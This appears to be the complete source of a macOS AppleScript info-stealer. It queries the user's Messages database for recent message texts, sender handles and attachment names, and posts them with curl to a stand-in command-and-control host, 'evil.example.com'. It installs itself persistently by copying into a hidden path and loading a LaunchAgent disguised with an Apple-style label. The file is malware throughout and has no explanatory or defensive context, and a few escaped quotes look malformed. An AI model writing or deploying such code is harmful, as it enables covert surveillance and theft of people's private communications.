-- === CONFIGURATION ===
property c2url : "http://evil.example.com"
property plistLabel : "com.apple.msglogger"
property hiddenScript : POSIX path of (path to home folder) & "Library/Containers/.dis.msg.scpt"
property launchAgentPath : POSIX path of (path to home folder) & "Library/LaunchAgents/" & plistLabel & ".plist"
property chatDB : POSIX path of (path to home folder) & "Library/Messages/chat.db"

-- === MAIN PAYLOAD ===
try
	-- 🧠 Extract 10 latest messages with timestamps
	set msgCmd to "sqlite3 " & quoted form of chatDB & " 'SELECT datetime(date/1000000000 + strftime(\"%s\", \"2001-01-01\"), \"unixepoch\", \"localtime\"), text FROM message ORDER BY date DESC LIMIT 10;'"
	set messages to do shell script msgCmd

	-- 🧑‍💬 Extract senders and message pairs
	set senderCmd to "sqlite3 " & quoted form of chatDB & \" 'SELECT handle.id, message.text FROM message JOIN handle ON message.handle_id = handle.ROWID ORDER BY message.date DESC LIMIT 10;'"
	set senders to do shell script senderCmd

	-- 📎 Extract recent attachments
	set attachCmd to "sqlite3 " & quoted form of chatDB & \" 'SELECT filename FROM attachment ORDER BY ROWID DESC LIMIT 3;'"
	set attachments to do shell script attachCmd

	-- 📤 Exfiltrate to remote server
	set fullDump to "MESSAGES=" & messages & linefeed & "SENDERS=" & senders & linefeed & "ATTACHMENTS=" & attachments
	do shell script "curl -s -X POST -d " & quoted form of ("data=" & fullDump) & " " & c2url & "/upload"

on error errMsg
	do shell script "curl -s -X POST -d " & quoted form of ("error=" & errMsg) & " " & c2url & "/error"
end try

-- === PERSISTENCE SETUP ===
try
	-- 🕳️ Drop self to hidden location if not already present
	if (do shell script "test -f " & quoted form of hiddenScript & " && echo 1 || echo 0") is "0" then
		do shell script "cp " & quoted form of (POSIX path of (path to me)) & " " & quoted form of hiddenScript
	end if

	-- 🧬 Create LaunchAgent .plist
	set plistXML to "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n\t<key>Label</key>\n\t<string>" & plistLabel & "</string>\n\t<key>ProgramArguments</key>\n\t<array>\n\t\t<string>/usr/bin/osascript</string>\n\t\t<string>" & hiddenScript & "</string>\n\t</array>\n\t<key>RunAtLoad</key>\n\t<true/>\n</dict>\n</plist>"
	do shell script "echo " & quoted form of plistXML & " > " & quoted form of launchAgentPath
	do shell script "launchctl load -w " & quoted form of launchAgentPath
end try
